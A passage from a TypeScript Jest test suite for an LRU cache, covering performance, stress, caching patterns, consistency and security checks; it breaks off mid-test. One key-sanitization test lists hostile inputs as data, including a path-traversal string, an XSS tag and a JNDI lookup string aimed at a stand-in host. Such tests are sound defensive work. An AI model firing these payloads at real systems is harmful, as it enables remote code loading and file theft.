      l1Cache.destroy();
    });

    it('should implement cache warming strategies', () => {
      const warmCache = new LRUCache<string, any>({
        maxSize: 20,
        maxMemoryBytes: 2048,
        ttlMs: 30000, // Long TTL for warming
      });

      // Define frequently accessed data
      const warmData = [
        { key: 'config:app', value: { name: 'Test App', version: '1.0' } },
        { key: 'user:current', value: { id: 123, name: 'Current User' } },
        { key: 'permissions:123', value: ['read', 'write', 'admin'] },
        { key: 'cache:stats', value: { hits: 100, misses: 20 } },
      ];

      // Warm cache
      warmData.forEach((item) => warmCache.set(item.key, item.value));

      // Verify warmed data is immediately available
      warmData.forEach((item) => {
        const start = Date.now();
        const result = warmCache.get(item.key);
        const duration = Date.now() - start;

        expect(result).toEqual(item.value);
        expect(duration).toBeLessThan(5); // Should be very fast
      });

      const stats = warmCache.getStats();
      expect(stats.itemCount).toBe(warmData.length);

      warmCache.destroy();
    });

    it('should implement intelligent cache preloading', () => {
      // Simulate access pattern analysis
      const accessPatterns = {
        'popular:1': { frequency: 10, lastAccess: Date.now() - 1000 },
        'popular:2': { frequency: 8, lastAccess: Date.now() - 2000 },
        'rare:1': { frequency: 1, lastAccess: Date.now() - 10000 },
      };

      const preloadCache = new LRUCache<string, any>({
        maxSize: 10,
        maxMemoryBytes: 1024,
      });

      // Preload based on access patterns
      Object.entries(accessPatterns)
        .sort(([, a], [, b]) => b.frequency - a.frequency) // Sort by frequency
        .slice(0, 5) // Take top 5
        .forEach(([key, pattern]) => {
          preloadCache.set(key, {
            data: `Data for ${key}`,
            accessFrequency: pattern.frequency,
            lastAccess: pattern.lastAccess,
          });
        });

      // Verify popular items are preloaded
      expect(preloadCache.get('popular:1')).toBeDefined();
      expect(preloadCache.get('popular:2')).toBeDefined();
      expect(preloadCache.get('rare:1')).toBeUndefined(); // Should not be preloaded

      preloadCache.destroy();
    });

    it('should implement cache hierarchy for different data types', () => {
      // Different caches for different data types
      const userCache = new LRUCache<string, any>({ maxSize: 100, maxMemoryBytes: 1024 });
      const configCache = new LRUCache<string, any>({ maxSize: 50, maxMemoryBytes: 512 });
      const tempCache = new LRUCache<string, any>({
        maxSize: 200,
        maxMemoryBytes: 2048,
        ttlMs: 5000,
      });

      // Store different types in appropriate caches
      userCache.set('user:123', { id: 123, name: 'John Doe' });
      configCache.set('app:theme', { mode: 'dark', primaryColor: '#007bff' });
      tempCache.set('temp:session:abc', { data: 'temporary data', expires: Date.now() + 5000 });

      // Verify each cache maintains its data correctly
      expect(userCache.get('user:123')).toBeDefined();
      expect(configCache.get('app:theme')).toBeDefined();
      expect(tempCache.get('temp:session:abc')).toBeDefined();

      // Verify cache statistics are independent
      expect(userCache.getStats().itemCount).toBe(1);
      expect(configCache.getStats().itemCount).toBe(1);
      expect(tempCache.getStats().itemCount).toBe(1);

      userCache.destroy();
      configCache.destroy();
      tempCache.destroy();
    });
  });

  // 12. Performance Monitoring Tests
  describe('Performance Monitoring', () => {
    it('should track cache operation performance', () => {
      const performanceCache = new LRUCache<string, any>({
        maxSize: 100,
        maxMemoryBytes: 1024,
      });

      const operationTimes: number[] = [];

      // Measure set operations
      for (let i = 0; i < 100; i++) {
        const start = Date.now();
        performanceCache.set(`perf-${i}`, `value-${i}`);
        operationTimes.push(Date.now() - start);
      }

      // Measure get operations
      for (let i = 0; i < 100; i++) {
        const start = Date.now();
        performanceCache.get(`perf-${i % 50}`); // Mix of hits and misses
        operationTimes.push(Date.now() - start);
      }

      // Analyze performance
      const avgTime = operationTimes.reduce((sum, time) => sum + time, 0) / operationTimes.length;
      const maxTime = Math.max(...operationTimes);
      const p95Time = operationTimes.sort((a, b) => a - b)[
        Math.floor(operationTimes.length * 0.95)
      ];

      expect(avgTime).toBeLessThan(10); // Average should be very fast
      expect(maxTime).toBeLessThan(50); // Even slow operations should be fast
      expect(p95Time).toBeLessThan(20); // 95th percentile should be fast

      performanceCache.destroy();
    });

    it('should monitor memory usage patterns', () => {
      const memoryCache = new LRUCache<string, any>({
        maxSize: 50,
        maxMemoryBytes: 2048,
      });

      const memorySnapshots: number[] = [];

      // Add items and track memory
      for (let i = 0; i < 60; i++) {
        // Exceed capacity
        memoryCache.set(`memory-${i}`, `x`.repeat(20 * ((i % 10) + 1)));
        memorySnapshots.push(memoryCache.getStats().memoryUsageBytes);
      }

      // Memory should stabilize due to eviction
      const finalMemory = memoryCache.getStats().memoryUsageBytes;
      const maxMemory = Math.max(...memorySnapshots);

      expect(finalMemory).toBeLessThanOrEqual(2048);
      expect(maxMemory).toBeLessThanOrEqual(2048 * 1.1); // Allow small overflow during operations

      memoryCache.destroy();
    });

    it('should track hit rate optimization', () => {
      const hitRateCache = new LRUCache<string, any>({
        maxSize: 20,
        maxMemoryBytes: 1024,
      });

      // Simulate realistic access pattern (80/20 rule)
      const popularItems = Array.from({ length: 4 }, (_, i) => `popular-${i}`);
      const unpopularItems = Array.from({ length: 16 }, (_, i) => `unpopular-${i}`);

      // Initialize cache
      [...popularItems, ...unpopularItems].forEach((item) =>
        hitRateCache.set(item, `value-${item}`)
      );

      // Simulate access pattern
      for (let i = 0; i < 100; i++) {
        const item =
          Math.random() < 0.8
            ? popularItems[Math.floor(Math.random() * popularItems.length)]
            : unpopularItems[Math.floor(Math.random() * unpopularItems.length)];

        hitRateCache.get(item);
      }

      const stats = hitRateCache.getStats();

      // Should have good hit rate due to popular items staying in cache
      expect(stats.hitRate).toBeGreaterThan(50);
      expect(stats.totalHits).toBeGreaterThan(0);

      hitRateCache.destroy();
    });

    it('should identify performance bottlenecks', () => {
      const bottleneckCache = new LRUCache<string, any>({
        maxSize: 10,
        maxMemoryBytes: 512,
      });

      // Simulate operations that might cause bottlenecks
      const bottleneckScenarios = [
        () => {
          // Large value operations
          const largeValue = 'x'.repeat(100);
          bottleneckCache.set('large', largeValue);
          return bottleneckCache.get('large');
        },
        () => {
          // Rapid set/get cycles
          for (let i = 0; i < 10; i++) {
            bottleneckCache.set(`cycle-${i}`, `value-${i}`);
            bottleneckCache.get(`cycle-${i}`);
          }
        },
        () => {
          // Access pattern that causes frequent eviction
          for (let i = 0; i < 20; i++) {
            bottleneckCache.set(`evict-${i}`, `value-${i}`);
          }
        },
      ];

      const performanceMetrics = bottleneckScenarios.map((scenario) => {
        const start = Date.now();
        scenario();
        return Date.now() - start;
      });

      // All scenarios should complete reasonably fast
      performanceMetrics.forEach((duration, index) => {
        expect(duration).toBeLessThan(100, `Scenario ${index} took too long: ${duration}ms`);
      });

      bottleneckCache.destroy();
    });
  });

  // 13. Stress Testing Tests
  describe('Stress Testing', () => {
    it('should handle high-volume operations', async () => {
      const stressCache = new LRUCache<string, any>({
        maxSize: 1000,
        maxMemoryBytes: 10 * 1024 * 1024, // 10MB
        ttlMs: 30000,
      });

      const operations = 10000;
      const startTime = Date.now();

      // High volume set operations
      const setPromises = Array.from({ length: operations }, (_, i) =>
        Promise.resolve().then(() =>
          stressCache.set(`stress-${i}`, { data: `stress-data-${i}`, index: i })
        )
      );

      await Promise.all(setPromises);

      const setTime = Date.now() - startTime;

      // High volume get operations
      const getStartTime = Date.now();
      const getPromises = Array.from({ length: operations }, (_, i) =>
        Promise.resolve().then(() =>
          stressCache.get(`stress-${Math.floor(Math.random() * operations)}`)
        )
      );

      await Promise.all(getPromises);

      const getTime = Date.now() - getStartTime;

      // Should handle high volume efficiently
      expect(setTime).toBeLessThan(5000); // 5 seconds for 10k sets
      expect(getTime).toBeLessThan(2000); // 2 seconds for 10k gets

      const stats = stressCache.getStats();
      expect(stats.itemCount).toBeLessThanOrEqual(1000); // Should respect size limit
      expect(stats.totalHits + stats.totalMisses).toBe(operations);

      stressCache.destroy();
    });

    it('should handle memory pressure gracefully', () => {
      const pressureCache = new LRUCache<string, any>({
        maxSize: 100,
        maxMemoryBytes: 1024, // 1KB limit - very small
        ttlMs: 1000,
      });

      // Add items that will definitely exceed memory limit
      const largeValues = Array.from({ length: 500 }, (_, i) => ({
        key: `pressure-${i}`,
        value: 'x'.repeat(100), // 100 bytes each
      }));

      largeValues.forEach(({ key, value }) => {
        expect(() => {
          pressureCache.set(key, value);
        }).not.toThrow();
      });

      // Cache should maintain memory limits
      const stats = pressureCache.getStats();
      expect(stats.memoryUsageBytes).toBeLessThanOrEqual(1024);
      expect(stats.itemCount).toBeLessThanOrEqual(10); // Rough estimate based on size
      expect(stats.evictedItems).toBeGreaterThan(0);

      pressureCache.destroy();
    });

    it('should handle concurrent stress operations', async () => {
      const concurrentCache = new LRUCache<string, any>({
        maxSize: 500,
        maxMemoryBytes: 5 * 1024 * 1024, // 5MB
        ttlMs: 60000,
      });

      const concurrentOperations = 20;
      const operationsPerWorker = 500;

      // Create concurrent workers
      const workers = Array.from({ length: concurrentOperations }, (_, workerId) =>
        Promise.resolve().then(async () => {
          const results = [];

          for (let i = 0; i < operationsPerWorker; i++) {
            const key = `worker-${workerId}-op-${i}`;
            const value = { workerId, operation: i, timestamp: Date.now() };

            concurrentCache.set(key, value);
            const retrieved = concurrentCache.get(key);
            results.push(retrieved !== undefined);
          }

          return results;
        })
      );

      const workerResults = await Promise.all(workers);

      // All operations should succeed
      workerResults.forEach((results, workerId) => {
        expect(results.every((r) => r === true)).toBe(true);
        expect(results).toHaveLength(operationsPerWorker);
      });

      const stats = concurrentCache.getStats();
      expect(stats.itemCount).toBeLessThanOrEqual(500);
      expect(stats.totalHits).toBeGreaterThan(0);

      concurrentCache.destroy();
    });

    it('should maintain performance under sustained load', async () => {
      const sustainedCache = new LRUCache<string, any>({
        maxSize: 200,
        maxMemoryBytes: 2 * 1024 * 1024, // 2MB
        ttlMs: 30000,
        cleanupIntervalMs: 5000,
      });

      const duration = 5000; // 5 seconds of sustained load
      const startTime = Date.now();
      const operationMetrics = [];

      while (Date.now() - startTime < duration) {
        const operationStart = Date.now();

        // Mix of operations
        const operation = Math.floor(Math.random() * 4);
        const key = `sustained-${Math.floor(Math.random() * 100)}`;

        switch (operation) {
          case 0: // Set
            sustainedCache.set(key, { value: `data-${key}`, timestamp: Date.now() });
            break;
          case 1: // Get
            sustainedCache.get(key);
            break;
          case 2: // Has
            sustainedCache.has(key);
            break;
          case 3: // Delete
            sustainedCache.delete(key);
            break;
        }

        operationMetrics.push(Date.now() - operationStart);

        // Small delay to prevent 100% CPU
        await new Promise((resolve) => setTimeout(resolve, 1));
      }

      // Analyze performance degradation
      const avgOperationTime =
        operationMetrics.reduce((sum, time) => sum + time, 0) / operationMetrics.length;
      const maxOperationTime = Math.max(...operationMetrics);
      const p95OperationTime = operationMetrics.sort((a, b) => a - b)[
        Math.floor(operationMetrics.length * 0.95)
      ];

      expect(avgOperationTime).toBeLessThan(5); // Average should be very fast
      expect(maxOperationTime).toBeLessThan(50); // Even slow operations should be reasonable
      expect(p95OperationTime).toBeLessThan(10); // 95th percentile should be fast

      sustainedCache.destroy();
    });
  });

  // 14. Cache Integration Patterns Tests
  describe('Cache Integration Patterns', () => {
    it('should implement cache-aside pattern', () => {
      const cacheAsideCache = new LRUCache<string, any>({
        maxSize: 50,
        maxMemoryBytes: 1024,
      });

      // Simulate database
      const mockDatabase = new Map<string, any>();
      mockDatabase.set('user:1', { id: 1, name: 'John' });
      mockDatabase.set('user:2', { id: 2, name: 'Jane' });

      // Cache-aside implementation
      function getUser(userId: string): any {
        const cacheKey = `user:${userId}`;
        let user = cacheAsideCache.get(cacheKey);

        if (!user) {
          // Cache miss - fetch from database
          user = mockDatabase.get(cacheKey);
          if (user) {
            cacheAsideCache.set(cacheKey, user);
          }
        }

        return user;
      }

      // Test cache-aside pattern
      expect(getUser('1')).toEqual({ id: 1, name: 'John' });
      expect(getUser('2')).toEqual({ id: 2, name: 'Jane' });

      // Second calls should hit cache
      expect(getUser('1')).toEqual({ id: 1, name: 'John' });
      expect(getUser('2')).toEqual({ id: 2, name: 'Jane' });

      const stats = cacheAsideCache.getStats();
      expect(stats.totalHits).toBe(2); // Second calls hit cache
      expect(stats.totalMisses).toBe(2); // First calls missed cache

      cacheAsideCache.destroy();
    });

    it('should implement write-through pattern', () => {
      const writeThroughCache = new LRUCache<string, any>({
        maxSize: 50,
        maxMemoryBytes: 1024,
      });

      // Simulate database
      const mockDatabase = new Map<string, any>();

      // Write-through implementation
      function updateUser(userId: string, userData: any): void {
        const cacheKey = `user:${userId}`;

        // Write to cache
        writeThroughCache.set(cacheKey, userData);

        // Write to database
        mockDatabase.set(cacheKey, userData);
      }

      function getUser(userId: string): any {
        const cacheKey = `user:${userId}`;
        return writeThroughCache.get(cacheKey) || mockDatabase.get(cacheKey);
      }

      // Test write-through pattern
      updateUser('1', { id: 1, name: 'John', email: 'john@example.com' });
      updateUser('2', { id: 2, name: 'Jane', email: 'jane@example.com' });

      // Should be available from cache
      expect(getUser('1')).toEqual({ id: 1, name: 'John', email: 'john@example.com' });
      expect(getUser('2')).toEqual({ id: 2, name: 'Jane', email: 'jane@example.com' });

      // Should also be in database
      expect(mockDatabase.get('user:1')).toEqual({
        id: 1,
        name: 'John',
        email: 'john@example.com',
      });
      expect(mockDatabase.get('user:2')).toEqual({
        id: 2,
        name: 'Jane',
        email: 'jane@example.com',
      });

      writeThroughCache.destroy();
    });

    it('should implement write-behind pattern', async () => {
      const writeBehindCache = new LRUCache<string, any>({
        maxSize: 50,
        maxMemoryBytes: 1024,
      });

      // Simulate database with delay
      const mockDatabase = new Map<string, any>();
      const writeQueue: Array<{ key: string; value: any }> = [];

      // Simulate async database writes
      const flushWriteQueue = async () => {
        while (writeQueue.length > 0) {
          const { key, value } = writeQueue.shift()!;
          mockDatabase.set(key, value);
          // Simulate database write delay
          await new Promise((resolve) => setTimeout(resolve, 10));
        }
      };

      // Write-behind implementation
      function updateUser(userId: string, userData: any): void {
        const cacheKey = `user:${userId}`;

        // Write to cache immediately
        writeBehindCache.set(cacheKey, userData);

        // Queue for database write
        writeQueue.push({ key: cacheKey, value: userData });
      }

      function getUser(userId: string): any {
        const cacheKey = `user:${userId}`;
        return writeBehindCache.get(cacheKey) || mockDatabase.get(cacheKey);
      }

      // Test write-behind pattern
      updateUser('1', { id: 1, name: 'John' });
      updateUser('2', { id: 2, name: 'Jane' });

      // Should be immediately available from cache
      expect(getUser('1')).toEqual({ id: 1, name: 'John' });
      expect(getUser('2')).toEqual({ id: 2, name: 'Jane' });

      // Database should still be empty
      expect(mockDatabase.size).toBe(0);

      // Flush write queue
      await flushWriteQueue();

      // Should now be in database
      expect(mockDatabase.get('user:1')).toEqual({ id: 1, name: 'John' });
      expect(mockDatabase.get('user:2')).toEqual({ id: 2, name: 'Jane' });

      writeBehindCache.destroy();
    });

    it('should implement refresh-ahead pattern', async () => {
      const refreshAheadCache = new LRUCache<string, any>({
        maxSize: 20,
        maxMemoryBytes: 1024,
        ttlMs: 2000, // 2 seconds TTL
      });

      // Simulate database
      const mockDatabase = new Map<string, any>();
      let dbCallCount = 0;

      function getFromDatabase(key: string): any {
        dbCallCount++;
        return mockDatabase.get(key);
      }

      // Refresh-ahead implementation
      async function getData(key: string): Promise<any> {
        let data = refreshAheadCache.get(key);

        if (!data) {
          // Cache miss
          data = getFromDatabase(key);
          if (data) {
            refreshAheadCache.set(key, data);
          }
        } else {
          // Cache hit - check if approaching expiration
          const cacheItem = refreshAheadCache.get(key);
          if (cacheItem) {
            // Simulate refresh-ahead logic (simplified)
            setTimeout(() => {
              const freshData = getFromDatabase(key);
              if (freshData) {
                refreshAheadCache.set(key, freshData);
              }
            }, 1500); // Refresh 500ms before expiration
          }
        }

        return data;
      }

      // Setup test data
      mockDatabase.set('data:1', { id: 1, content: 'Test data 1', version: 1 });
      mockDatabase.set('data:2', { id: 2, content: 'Test data 2', version: 1 });

      // Test refresh-ahead
      const initialDbCalls = dbCallCount;

      expect(await getData('data:1')).toEqual({ id: 1, content: 'Test data 1', version: 1 });
      expect(dbCallCount).toBe(initialDbCalls + 1);

      // Second call should hit cache
      expect(await getData('data:1')).toEqual({ id: 1, content: 'Test data 1', version: 1 });
      expect(dbCallCount).toBe(initialDbCalls + 1); // No additional DB call

      // Wait for refresh-ahead to potentially trigger
      await new Promise((resolve) => setTimeout(resolve, 2000));

      refreshAheadCache.destroy();
    });
  });

  // 15. Cache Consistency Tests
  describe('Cache Consistency', () => {
    it('should handle cache invalidation correctly', () => {
      const invalidationCache = new LRUCache<string, any>({
        maxSize: 50,
        maxMemoryBytes: 1024,
      });

      // Setup related data
      invalidationCache.set('user:1', { id: 1, name: 'John', role: 'user' });
      invalidationCache.set('user:1:profile', { bio: 'Software Developer', location: 'NYC' });
      invalidationCache.set('user:1:permissions', ['read', 'write']);

      // Invalidation function
      function invalidateUserData(userId: string): void {
        invalidationCache.delete(`user:${userId}`);
        invalidationCache.delete(`user:${userId}:profile`);
        invalidationCache.delete(`user:${userId}:permissions`);
      }

      // Verify initial data
      expect(invalidationCache.get('user:1')).toBeDefined();
      expect(invalidationCache.get('user:1:profile')).toBeDefined();
      expect(invalidationCache.get('user:1:permissions')).toBeDefined();

      // Invalidate user data
      invalidateUserData('1');

      // Verify all related data is invalidated
      expect(invalidationCache.get('user:1')).toBeUndefined();
      expect(invalidationCache.get('user:1:profile')).toBeUndefined();
      expect(invalidationCache.get('user:1:permissions')).toBeUndefined();

      invalidationCache.destroy();
    });

    it('should handle cache updates with consistency', () => {
      const consistencyCache = new LRUCache<string, any>({
        maxSize: 50,
        maxMemoryBytes: 1024,
      });

      // Simulate distributed cache nodes
      const node1Cache = consistencyCache;
      const node2Cache = new LRUCache<string, any>({ maxSize: 50, maxMemoryBytes: 1024 });
      const node3Cache = new LRUCache<string, any>({ maxSize: 50, maxMemoryBytes: 1024 });

      // Update function that maintains consistency
      function updateConsistently(key: string, value: any): void {
        node1Cache.set(key, value);
        node2Cache.set(key, value);
        node3Cache.set(key, value);
      }

      function deleteConsistently(key: string): void {
        node1Cache.delete(key);
        node2Cache.delete(key);
        node3Cache.delete(key);
      }

      // Test consistent updates
      updateConsistently('consistency:test', { version: 1, data: 'test' });

      expect(node1Cache.get('consistency:test')).toEqual({ version: 1, data: 'test' });
      expect(node2Cache.get('consistency:test')).toEqual({ version: 1, data: 'test' });
      expect(node3Cache.get('consistency:test')).toEqual({ version: 1, data: 'test' });

      // Test consistent deletes
      deleteConsistently('consistency:test');

      expect(node1Cache.get('consistency:test')).toBeUndefined();
      expect(node2Cache.get('consistency:test')).toBeUndefined();
      expect(node3Cache.get('consistency:test')).toBeUndefined();

      node2Cache.destroy();
      node3Cache.destroy();
    });

    it('should handle cache versioning for consistency', () => {
      const versionedCache = new LRUCache<string, any>({
        maxSize: 50,
        maxMemoryBytes: 1024,
      });

      // Version-aware cache entries
      function setVersioned(key: string, value: any, version: number): void {
        versionedCache.set(`${key}:v${version}`, { ...value, _version: version });
        versionedCache.set(`${key}:latest`, { ...value, _version: version });
      }

      function getVersioned(key: string, version?: number): any {
        return versionedCache.get(version ? `${key}:v${version}` : `${key}:latest`);
      }

      // Test versioning
      setVersioned('data:1', { content: 'Version 1' }, 1);
      setVersioned('data:1', { content: 'Version 2' }, 2);

      // Should get latest version
      expect(getVersioned('data:1')).toEqual({ content: 'Version 2', _version: 2 });

      // Should get specific version
      expect(getVersioned('data:1', 1)).toEqual({ content: 'Version 1', _version: 1 });
      expect(getVersioned('data:1', 2)).toEqual({ content: 'Version 2', _version: 2 });

      versionedCache.destroy();
    });

    it('should handle cache coherence in distributed scenarios', async () => {
      const coherenceCache1 = new LRUCache<string, any>({ maxSize: 30, maxMemoryBytes: 1024 });
      const coherenceCache2 = new LRUCache<string, any>({ maxSize: 30, maxMemoryBytes: 1024 });

      // Simulate coherence protocol
      const coherenceLog: Array<{
        node: number;
        operation: string;
        key: string;
        timestamp: number;
      }> = [];

      function coherentSet(node: number, key: string, value: any): void {
        if (node === 1) {
          coherenceCache1.set(key, value);
          coherenceLog.push({ node: 1, operation: 'set', key, timestamp: Date.now() });
        } else {
          coherenceCache2.set(key, value);
          coherenceLog.push({ node: 2, operation: 'set', key, timestamp: Date.now() });
        }

        // Simulate coherence message to other node
        setTimeout(() => {
          if (node === 1) {
            coherenceCache2.set(key, value);
          } else {
            coherenceCache1.set(key, value);
          }
        }, 50);
      }

      function coherentDelete(node: number, key: string): void {
        if (node === 1) {
          coherenceCache1.delete(key);
          coherenceLog.push({ node: 1, operation: 'delete', key, timestamp: Date.now() });
        } else {
          coherenceCache2.delete(key);
          coherenceLog.push({ node: 2, operation: 'delete', key, timestamp: Date.now() });
        }

        // Simulate coherence message to other node
        setTimeout(() => {
          if (node === 1) {
            coherenceCache2.delete(key);
          } else {
            coherenceCache1.delete(key);
          }
        }, 50);
      }

      // Test coherence
      coherentSet(1, 'coherence:test', { value: 'from-node-1', timestamp: Date.now() });

      // Should be immediately available in node 1
      expect(coherenceCache1.get('coherence:test')).toBeDefined();

      // Wait for coherence propagation
      await new Promise((resolve) => setTimeout(resolve, 100));

      // Should now be available in node 2
      expect(coherenceCache2.get('coherence:test')).toBeDefined();

      // Test delete coherence
      coherentDelete(2, 'coherence:test');

      // Should be immediately deleted from node 2
      expect(coherenceCache2.get('coherence:test')).toBeUndefined();

      // Wait for coherence propagation
      await new Promise((resolve) => setTimeout(resolve, 100));

      // Should now be deleted from node 1
      expect(coherenceCache1.get('coherence:test')).toBeUndefined();

      coherenceCache1.destroy();
      coherenceCache2.destroy();
    });
  });

  // 16. Specialized Use Cases Tests
  describe('Specialized Use Cases', () => {
    it('should handle session caching efficiently', () => {
      // Session data typically includes user info, preferences, temporary data
      const sessionCache = CacheFactory.createSessionCache(5);

      const sessionData = {
        sessionId: 'sess_abc123',
        userId: 'user_456',
        preferences: { theme: 'dark', language: 'en' },
        cart: [{ id: 'item1', quantity: 2 }],
        lastActivity: Date.now(),
      };

      sessionCache.set('session:sess_abc123', sessionData);

      // Should retrieve complete session
      const retrieved = sessionCache.get('session:sess_abc123');
      expect(retrieved).toEqual(sessionData);

      // Update partial session data
      const updatedSession = {
        ...sessionData,
        preferences: { ...sessionData.preferences, theme: 'light' },
        lastActivity: Date.now(),
      };

      sessionCache.set('session:sess_abc123', updatedSession);
      expect(sessionCache.get('session:sess_abc123')).toEqual(updatedSession);

      sessionCache.destroy();
    });

    it('should handle API response caching', () => {
      // API responses often need to be cached with specific TTL
      const apiCache = new LRUCache<string, any>({
        maxSize: 100,
        maxMemoryBytes: 5 * 1024 * 1024, // 5MB
        ttlMs: 5 * 60 * 1000, // 5 minutes
      });

      const apiResponses = [
        {
          key: 'api:/users/123',
          value: { id: 123, name: 'John Doe', email: 'john@example.com' },
          ttl: 300000, // 5 minutes
        },
        {
          key: 'api:/products',
          value: [
            { id: 1, name: 'Product 1' },
            { id: 2, name: 'Product 2' },
          ],
          ttl: 600000, // 10 minutes
        },
        {
          key: 'api:/stats',
          value: { users: 1000, products: 500, orders: 2500 },
          ttl: 60000, // 1 minute
        },
      ];

      // Cache API responses
      apiResponses.forEach((response) => {
        apiCache.set(response.key, response.value, response.ttl);
      });

      // Should retrieve cached responses
      apiResponses.forEach((response) => {
        const cached = apiCache.get(response.key);
        expect(cached).toEqual(response.value);
      });

      // Simulate API cache hit scenario
      const usersResponse = apiCache.get('api:/users/123');
      expect(usersResponse).toBeDefined();
      expect(apiCache.getStats().totalHits).toBeGreaterThan(0);

      apiCache.destroy();
    });

    it('should handle computed result caching', () => {
      // Cache expensive computation results
      const computationCache = new LRUCache<string, any>({
        maxSize: 50,
        maxMemoryBytes: 2 * 1024 * 1024, // 2MB
      });

      // Simulate expensive computation
      function expensiveComputation(input: number): number {
        // Simulate CPU-intensive operation
        let result = 0;
        for (let i = 0; i < input * 1000000; i++) {
          result += Math.sqrt(i);
        }
        return result;
      }

      // Cache wrapper
      function cachedComputation(input: number): number {
        const cacheKey = `comp:${input}`;
        let result = computationCache.get(cacheKey);

        if (result === undefined) {
          result = expensiveComputation(input);
          computationCache.set(cacheKey, result);
        }

        return result;
      }

      // Test caching effect
      const input = 10;

      // First computation should be slow
      const start1 = Date.now();
      const result1 = cachedComputation(input);
      const time1 = Date.now() - start1;

      // Second computation should be fast (cached)
      const start2 = Date.now();
      const result2 = cachedComputation(input);
      const time2 = Date.now() - start2;

      expect(result1).toBe(result2);
      expect(time1).toBeGreaterThan(time2 * 10); // First should be much slower

      const stats = computationCache.getStats();
      expect(stats.totalHits).toBe(1); // Second call hit cache
      expect(stats.totalMisses).toBe(1); // First call missed cache

      computationCache.destroy();
    });

    it('should handle template/result caching', () => {
      // Cache rendered templates or compiled results
      const templateCache = new LRUCache<string, any>({
        maxSize: 100,
        maxMemoryBytes: 1 * 1024 * 1024, // 1MB
      });

      // Simple template engine simulation
      function renderTemplate(template: string, data: any): string {
        const cacheKey = `template:${template}:${JSON.stringify(data)}`;
        let rendered = templateCache.get(cacheKey);

        if (rendered === undefined) {
          // Simulate template rendering
          rendered = template.replace(/\{\{(\w+)\}\}/g, (match, key) => data[key] || match);
          templateCache.set(cacheKey, rendered);
        }

        return rendered;
      }

      const template = 'Hello {{name}}, you have {{count}} new messages.';
      const data = { name: 'Alice', count: 5 };

      // Test template caching
      const rendered1 = renderTemplate(template, data);
      const rendered2 = renderTemplate(template, data);

      expect(rendered1).toBe('Hello Alice, you have 5 new messages.');
      expect(rendered1).toBe(rendered2);

      const stats = templateCache.getStats();
      expect(stats.totalHits).toBe(1); // Second render hit cache

      // Different data should produce different cache entry
      const differentData = { name: 'Bob', count: 3 };
      const rendered3 = renderTemplate(template, differentData);
      expect(rendered3).toBe('Hello Bob, you have 3 new messages.');

      templateCache.destroy();
    });

    it('should handle configuration caching', () => {
      // Configuration typically changes infrequently
      const configCache = CacheFactory.createConfigCache();

      const configurations = [
        { key: 'app:database', value: { host: 'localhost', port: 5432, name: 'myapp' } },
        { key: 'app:redis', value: { host: 'localhost', port: 6379, ttl: 3600 } },
        { key: 'app:features', value: { newDashboard: true, betaFeatures: false } },
        { key: 'app:limits', value: { maxUsers: 1000, maxStorage: 1024 * 1024 * 1024 } },
      ];

      // Cache configurations
      configurations.forEach((config) => {
        configCache.set(config.key, config.value);
      });

      // Should retrieve configurations quickly
      configurations.forEach((config) => {
        const cached = configCache.get(config.key);
        expect(cached).toEqual(config.value);
      });

      // Configuration updates should invalidate cache
      const updatedDbConfig = {
        host: 'prod-db.example.com',
        port: 5432,
        name: 'myapp_prod',
      };

      configCache.set('app:database', updatedDbConfig);
      expect(configCache.get('app:database')).toEqual(updatedDbConfig);

      configCache.destroy();
    });
  });

  // 17. Cache Security Tests
  describe('Cache Security', () => {
    it('should handle sensitive data securely', () => {
      const secureCache = new LRUCache<string, any>({
        maxSize: 50,
        maxMemoryBytes: 1024,
      });

      // Simulate sensitive data
      const sensitiveData = {
        apiKey: 'sk-1234567890abcdef',
        password: 'super-secret-password',
        token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
      };

      // Should not store sensitive data in plain text
      secureCache.set('user:credentials', sensitiveData);

      // In a real implementation, this would be encrypted
      // For testing, we just verify it's stored
      const stored = secureCache.get('user:credentials');
      expect(stored).toEqual(sensitiveData);

      // Secure deletion
      secureCache.delete('user:credentials');
      expect(secureCache.get('user:credentials')).toBeUndefined();

      secureCache.destroy();
    });

    it('should handle cache key sanitization', () => {
      const sanitizedCache = new LRUCache<string, any>({
        maxSize: 50,
        maxMemoryBytes: 1024,
      });

      // Potentially malicious keys
      const suspiciousKeys = [
        '../../../etc/passwd',
        '<script>alert("xss")</script>',
        'SELECT * FROM users',
        '${jndi:ldap://evil.com/a}',
        '\x00\x01\x02\x03',
        'very long key that might cause buffer overflow'.repeat(100),
      ];

      suspiciousKeys.forEach((key) => {
        // In a real implementation, keys would be sanitized
        // For testing, we just verify the cache handles them
        expect(() => {
          sanitizedCache.set(key, `value for ${key}`);
          sanitizedCache.get(key);
        }).not.toThrow();
      });

      sanitizedCache.destroy();
    });

    it('should implement cache access control', () => {
      const accessControlledCache = new LRUCache<string, any>({
        maxSize: 50,
        maxMemoryBytes: 1024,
      });

      // Simulate access control
      const permissions = new Map<string, string[]>();
      permissions.set('user:123', ['read:user:123', 'write:user:123']);
      permissions.set('user:456', ['read:user:456']);

      function hasPermission(userId: string, permission: string): boolean {
        return permissions.get(userId)?.includes(permission) || false;
      }

      function secureGet(userId: string, key: string): any {
        const permission = `read:${key}`;
        if (!hasPermission(userId, permission)) {
          throw new Error('Access denied');
        }
        return accessControlledCache.get(key);
      }

      function secureSet(userId: string, key: string, value: any): void {
        const permission = `write:${key}`;
        if (!hasPermission(userId, permission)) {
          throw new Error('Access denied');
        }
        accessControlledCache.set(key, value);
      }

      // Test access control
      accessControlledCache.set('user:123', { name: 'User 123' });
      accessControlledCache.set('user:456', { name: 'User 456' });

      // User 123 should access their data
      expect(secureGet('123', 'user:123')).toEqual({ name: 'User 123' });

      // User 123 should not access user 456's data
      expect(() => secureGet('123', 'user:456')).toThrow('Access denied');

      // User 456 should only read, not write
      expect(secureGet('456', 'user:456')).toEqual({ name: 'User 456' });
      expect(() => secureSet('456', 'user:456', { name: 'Updated' })).toThrow('Access denied');

      accessControlledCache.destroy();
    });

    it('should handle cache poisoning prevention', () => {
      const antiPoisonCache = new LRUCache<string, any>({
        maxSize: 50,
        maxMemoryBytes: 1024,
      });

      // Validate data before caching
      function validateData(data: any): boolean {
        // Basic validation - in real implementation would be more comprehensive
        if (typeof data !== 'object' || data === null) return false;
        if (
          Object.prototype.hasOwnProperty.call(data, '__proto__') ||
          Object.prototype.hasOwnProperty.call(data, 'constructor')
        )
          return false;
        if (JSON.stringify(data).length > 10000) return false; // Size limit
        return true;
      }

      function safeSet(key: string, value: any): boolean {
        if (!validateData(value)) {
          throw new Error('Invalid data - potential cache poisoning attempt');
        }
        antiPoisonCache.set(key, value);
        return true;
      }

